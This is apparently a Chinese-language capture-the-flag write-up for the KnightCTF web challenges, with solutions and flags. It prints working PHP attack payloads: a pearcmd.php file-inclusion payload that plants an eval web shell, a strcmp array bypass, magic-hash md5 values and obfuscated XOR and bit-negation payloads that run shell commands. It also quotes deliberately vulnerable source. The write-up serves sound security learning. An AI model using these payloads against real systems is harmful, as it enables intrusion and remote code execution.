---
title: KnightCTF WEB
categories: 赛题wp
---

# 前言
不难，就是fuzz和脑洞有点多

# Do Something Special
按钮点击发现url转到 `/gr@b_y#ur_fl@g_h3r3!` ，`#` 明显不对，将其urlencode转码为%23访问出现flag 

Flag：KCTF{Sp3cial_characters_need_t0_get_Url_enc0ded}

<!--more-->

# My PHP Site
![](https://img-blog.csdnimg.cn/a860cb15d796496cb9830674f13b2cb1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

文件包含，可以利用伪协议读源码，也可以直接打pearcmd.php来getshell

payload
```
/?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?eval($_POST[0]);?>+-s+
```
再去包含执行命令

![](https://img-blog.csdnimg.cn/ddee8de58eaa412baab3f6618d1ea89d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

FLAG: KCTF{L0C4L_F1L3_1ncLu710n}

# Obsfuscation Isn't Enough
查看html发现jsfuck，解密发现 150484514b6eeb1d99da836d95f6671d.php

直接访问php文件，FLAG: KCTF{0bfuscat3d_J4v4Scr1pt_aka_JSFuck}

# Zero is not the limit
Hint: /user/
开始返回一堆json

![](https://img-blog.csdnimg.cn/88c8916beed548859e1bc4b1a290dffe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

/user/ 下对应每一个用户，访问-1出flag

FLAG: KCTF{tHeRe_1s_n0_l1m1t}

# Find Pass Code – 1
发现注释：
Hi Serafin, I learned something new today. 
I build this website for you to verify our KnightCTF 2022 pass code. You can view the source code by sending the source param

访问：url/?source得到源码
```php
<?php
require "flag.php";
if (isset($_POST["pass_code"])) {
    if (strcmp($_POST["pass_code"], $flag) == 0) {
        echo "KCTF Flag : {$flag}";
    } else {
        echo "Oh....My....God. You entered the wrong pass code.<br>";
    }
}
if (isset($_GET["source"])) {
    print show_source(__FILE__);
}
?>
```
数组bypass，Post: pass_code[]=1

FLAG: KCTF{ShOuLd_We_UsE_sTrCmP_lIkE_tHaT}

# Most Secure Calculator-1
![](https://img-blog.csdnimg.cn/813219e2d6ac4126a779ac24bbff0433.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

源码
```php
<?php
if (isset($_POST["equation"]) && !is_array($_POST["equation"])) {
if (empty($_POST["equation"])) {
echo "Please enter some eqation.";
} else {
if (strlen($_POST["equation"]) >= 25) {
	echo "Oow ! You have entered an equation that is too big for me.";
} else {
	echo "<h1> Result : <br>";
	eval("echo " . $_POST["equation"] . ";");
	echo "</h1>";
	}}}
?>
```
直接塞到eval
FLAG：KCTF{WaS_mY_cAlCuLaToR_sAfE}

# Find Pass Code - 2
- 魔术hash
- md5

```php
<?php
require "flag.php";
$old_pass_codes = array("0e215962017", "0e730083352", "0e807097110", "0e840922711");
$old_pass_flag = false;
if (isset($_POST["pass_code"]) && !is_array($_POST["pass_code"])) {
    foreach ($old_pass_codes as $old_pass_code) {
        if ($_POST["pass_code"] === $old_pass_code) {
            $old_pass_flag = true;
            break;
        }
    }
    if ($old_pass_flag) {
        echo "Sorry ! It's an old pass code.";
    } else if ($_POST["pass_code"] == md5($_POST["pass_code"])) {
        echo "KCTF Flag : {$flag}";
    } else {
        echo "Oh....My....God. You entered the wrong pass code.<br>";
    }
}
if (isset($_GET["source"])) {
    print show_source(__FILE__);
}
?>
```

爆破是不可能爆破的，搜集了魔术hash，随便挑个  [魔术hash](https://blog.csdn.net/u013512548/article/details/108213295)
```
0e215962017:0e291242476940776845150308577824
0e730083352:0e870635875304277170259950255928
0e807097110:0e318093639164485566453180786895
0e840922711:00e64922204642369621338070008986
0e1137126905:0e291659922323405260514745084877
0e1284838308:0e708279691820928818722257405159
0e2799298535:0e258310720843549656960157258725
0e3335999050:0e130023719718288785799459522477
0e3519466817:0e094940930906507337180165634011
```

FLAG：KCTF{ShOuD_wE_cOmPaRe_MD5_LiKe_ThAt__Be_SmArT}

# Bypass!! Bypass!! Bypass!!
注释发现
```
<!-- generats auth token -> /api/request/auth_token -->
```

经过尝试bypass 403 失败
```
/api/request/auth_token    Allow: POST, OPTIONS
/      Allow: GET, HEAD, OPTIONS
```
Github搜索得到源码  [bug-bounty-labs](https://github.com/leetCipher/bug-bounty-labs/blob/b5d6323c6514cc3740bd26bb56e8ac042c68ba73/admin-login-bypass/lab/app.py)

添加头部
**X-Authorized-For: 获取的token**

FLAG：KCTF{cOngRatUlaT10Ns_wElCoMe_t0_y0ur_daShBoaRd}

# Most Secure Calculator -2 
只允许字母数字，那就是异或 取反绕过,fuzz以下构造命令

payload
```
(~%8C%86%8C%8B%9A%92)(~%D7%DD%8F%88%9B%DD%D6%C4)
("393480"^"@@@@]]")(("8!4@80!8"^"[@@`^@_").(".").("484"^"@@@"))
"\163\171\163\164\145\155"("\143\141\164\40\146\154\141\147\56\164\170\164")
```
FLAG:  KCTF{sHoUlD_I_uSe_eVaL_lIkE_tHaT}

# Can you be Admin?	
User-Agent: KnightSquad ，接着，Referer: localhost

Jsfuck 发现 Unicode，[Unicode编码解码 (bt.cn)](https://www.bt.cn/tools/unicode.html)

```
F`V,7DIIBn+?CWe@<,q!$?0EpF*DPCA0<oU8RZI/DJ<`sF8
```

然后ascii85解码， [ASCII85解码计算器 ](https://www.jisuan.mobi/pbm3bmHuBN1bbySU.html)

username : tareq ，password : IamKnight

登录后是普通用户，然后返回包cookie返回奇怪字段base64后重新更改为Admin，发包 发现flag

FLAG: KCTF{FiN4LlY_y0u_ar3_4dm1N}

